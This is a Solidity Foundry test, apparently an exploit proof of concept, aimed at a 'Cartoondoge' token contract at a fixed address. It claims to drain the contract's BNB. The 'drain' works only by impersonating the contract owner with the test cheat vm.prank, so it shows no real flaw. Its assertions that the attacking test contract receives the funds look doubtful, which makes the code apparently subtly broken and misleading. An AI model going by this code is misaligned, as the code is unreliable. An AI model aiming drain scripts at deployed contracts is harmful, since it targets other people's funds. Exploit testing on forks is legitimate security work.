// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface Cartoondoge {
    function owner() external view returns (address);
    function SetMarketingWallet(address addr) external;
    function WithdrawAllMarketing() external;
    function SetDevWallet(address addr) external;
    function WithdrawAllDev() external;
    function MarketingBalance() external view returns (uint256);
    function DevBalance() external view returns (uint256);
    function RecoverBNB() external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0xeb58B47404F386286b0BF09cAE3C14d8b82F65CF;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use vm.prank to impersonate owner
        // Just need to get the owner address first
        address owner = Cartoondoge(TARGET).owner();
        vm.label(owner, "Contract Owner");
        vm.label(TARGET, "Cartoondoge Token");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Give the contract some BNB first
        uint256 contractBNB = 100 ether;
        deal(TARGET, contractBNB);

        // Record initial balance
        uint256 initialBalance = address(this).balance;

        // Get the contract owner
        address owner = Cartoondoge(TARGET).owner();

        // Impersonate the owner
        vm.startPrank(owner);

        // Drain all BNB from the contract
        Cartoondoge(TARGET).RecoverBNB();

        // Stop impersonation
        vm.stopPrank();

        // Verify we received funds
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Balance should have increased");

        // Also verify we got at least the amount we gave to the contract
        assertGe(finalBalance, initialBalance + contractBNB, "Should have received at least the BNB we gave to contract");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
